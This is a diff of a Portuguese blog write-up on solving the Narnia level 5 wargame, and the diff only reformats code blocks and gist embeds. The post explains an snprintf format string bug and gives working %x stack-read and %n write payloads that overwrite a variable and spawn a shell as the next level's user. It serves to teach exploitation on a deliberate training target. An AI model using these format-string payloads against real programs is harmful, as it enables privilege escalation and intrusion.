@@ -18,11 +18,11 @@ Quem diria que é mais trabalhoso escrever writeup do que resolver os desafios? 
 
 Hora de ownar o <strong>narnia5</strong>.
 
-https://gist.github.com/anonymous/f6fb1753c42a085a65b9cc1f21948bdf
+<script src="https://gist.github.com/anonymous/f6fb1753c42a085a65b9cc1f21948bdf.js"></script>
 
 O objetivo é claro, mudar o valor da variável <strong>i</strong> de 1 para 500. Hora de ver o código e criar teorias de como fazer isso.
 
-https://gist.github.com/anonymous/d743b46c946ffe171ea2a2ca5aa04f6f
+<script src="https://gist.github.com/anonymous/d743b46c946ffe171ea2a2ca5aa04f6f.js"></script>
 
 No inicio da função, <strong>i</strong> recebe o valor 1 e <strong>buffer</strong> é declarado como um vetor de char de tamanho 64. Depois, <a href="http://www.cplusplus.com/reference/cstdio/snprintf/">snprintf</a> manda para buffer 64 caracteres do argumento que passamos para o programa. É aqui que mora a vulnerabilidade que vai permitir mudar o valor de i.
 
@@ -48,28 +48,34 @@ Ao invés do correto, que seria:
 
 No primeiro caso, temos controle da string de formatação. Isto significa que inserir como argumento um "%s" fará com que snprintf tente imprimir uma string. Mesmo que essa string não exista.
 
-```narnia5@narnia:/narnia$ ./narnia5 %s
+```
+narnia5@narnia:/narnia$ ./narnia5 %s
 Change i's value from 1 -500. No way...let me give you a hint!
 buffer : [▒▒u^▒L9L$▒Av9▒D▒] (23)
-i = 1 (0xffffd74c)```
+i = 1 (0xffffd74c)
+```
 
 Consegue ver essa quantidade de lixo? Isso acontece porque, em uma chamada saudável para snprintf, por exemplo: <em>snprintf(buffer, 25, "%d %s", a, &amp;b)</em>  os dados ficariam organizados dessa forma:
 
-```(topo da stack)
+```
+(topo da stack)
 Endereço_de_retorno -
 endereço_de_b -
 valor_de_a
 ...
-(fundo da stack)```
+(fundo da stack)
+```
 
 É na stack que snprintf espera que os valores ou endereço destes valores estejam. Assim, não importa se esses valores tenham ou não sido passados como argumento para a função, snprintf irá ler o que estiver na stack.
 
 Há uma forma de ver esse mal comportamento na prática usando o chall. Ao passar argumentos suficientes, é possível ler o próprio argumento da stack.
 
-```narnia5@narnia:/narnia$ ./narnia5 AAAA.%x.%x.%x.%x.%x
+```
+narnia5@narnia:/narnia$ ./narnia5 AAAA.%x.%x.%x.%x.%x
 Change i's value from 1 -500. No way...let me give you a hint!
 buffer : [AAAA.f7eb7fe6.ffffffff.ffffd71e.f7e2ec34.41414141] (49)
-i = 1 (0xffffd73c)```
+i = 1 (0xffffd73c)
+```
 
 Usei %x para imprimir os valores em hex e você pode ver que o quinto %x foi substituído pelo valor <em><a href="https://pt.wikipedia.org/wiki/ASCII">41414141</a></em>.
 
@@ -89,10 +95,12 @@ Agora saindo da teoria para a prática.
 
 Lembra como, após alguns endereços, se consegue imprimir o próprio valor inserido? É dessa forma que passamos o endereço de i.
 
-```narnia5@melinda:/narnia$ ./narnia5 `python -c 'print \xdc\xd6\xff\xff%x%x%x%x%n &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;'`
+```
+narnia5@melinda:/narnia$ ./narnia5 `python -c 'print \xdc\xd6\xff\xff%x%x%x%x%n &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;'`
 Change i's value from 1 -500. No way...let me give you a hint!
 buffer : [▒▒▒▒f7eb7746ffffffffffffd6bef7e2fc34] (36)
-i = 36 (0xffffd6dc)```
+i = 36 (0xffffd6dc)
+```
 
 Uow, viu isso? Vamos por partes:
 
@@ -104,12 +112,14 @@ Por esse motivo que i teve seu valor substituído por 36. Não é por coincidên
 
 Agora se pode passar um argumento com 500 bytes e ver /bin/sh ser executado com privilégios de narnia6.
 
-```narnia5@melinda:/narnia$ ./narnia5 `python -c 'print \xdc\xd6\xff\xff%-472s%x%x%x%n'`
+```
+narnia5@melinda:/narnia$ ./narnia5 `python -c 'print \xdc\xd6\xff\xff%-472s%x%x%x%n'`
 Change i's value from 1 -500. GOOD
 $ cat /etc/narnia_pass/narnia5
 cat: /etc/narnia_pass/narnia5: Permission denied
 $ whoami
-narnia6```
+narnia6
+```
 
 Nem precisa escrever na mão os 500. O <a href="https://stackoverflow.com/questions/276827/string-padding-in-c">%472s</a> faz o trabalho de preencher o buffer.
 
